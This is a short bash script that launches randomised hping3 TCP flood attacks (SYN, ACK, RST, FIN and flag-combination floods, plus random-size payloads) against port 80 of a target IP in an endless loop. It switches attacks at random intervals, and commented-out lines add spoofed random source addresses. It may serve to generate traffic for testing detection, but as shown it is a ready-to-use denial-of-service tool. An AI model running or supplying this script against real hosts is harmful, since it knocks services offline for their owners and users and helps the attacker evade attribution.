#!/bin/bash

echo "Starting TCP Attacks on $TARGET_IP..."

TCP_ATTACKS=(
    "hping3 -S --flood -p 80 $TARGET_IP"
    "hping3 -A --flood -p 80 $TARGET_IP"
    "hping3 -R --flood -p 80 $TARGET_IP"
    "hping3 -F --flood -p 80 $TARGET_IP"
    "hping3 -F -P -U --flood -p 80 $TARGET_IP"
    "hping3 -S -p 80 -d 10 --flood $TARGET_IP"
    "hping3 -S -p 80 -d $((RANDOM % 1000 + 500)) --flood $TARGET_IP"  # TCP payload attack


    # "hping3 -S --flood -p 80 --rand-source $TARGET_IP"
    # "hping3 -A --flood -p 80 --rand-source $TARGET_IP"
    # "hping3 -R --flood -p 80 --rand-source $TARGET_IP"
    # "hping3 -F --flood -p 80 --rand-source $TARGET_IP"
    # "hping3 -F -P -U --flood -p 80 --rand-source $TARGET_IP"
    # "hping3 -S -p 80 -d 10 --flood --rand-source $TARGET_IP"
    # "hping3 -S -p $((RANDOM % 65535 + 1)) --flood --rand-source $TARGET_IP"
)



while true; do 
    SLEEP_INTERVALS=("$((RANDOM % 11 + 5))" "$((RANDOM % 46 + 15))" "$((RANDOM % 31 + 60))")
    RANDOM_SLEEP=${SLEEP_INTERVALS[$((RANDOM % 3))]}
    RANDOM_INDEX=$((RANDOM % ${#TCP_ATTACKS[@]}))

    echo "Executing: ${TCP_ATTACKS[$RANDOM_INDEX]} for $RANDOM_SLEEP seconds..."
    eval "${TCP_ATTACKS[$RANDOM_INDEX]}" &

    sleep $RANDOM_SLEEP

    killall hping3

    sleep 8
done



echo "TCP Attacks Completed!"
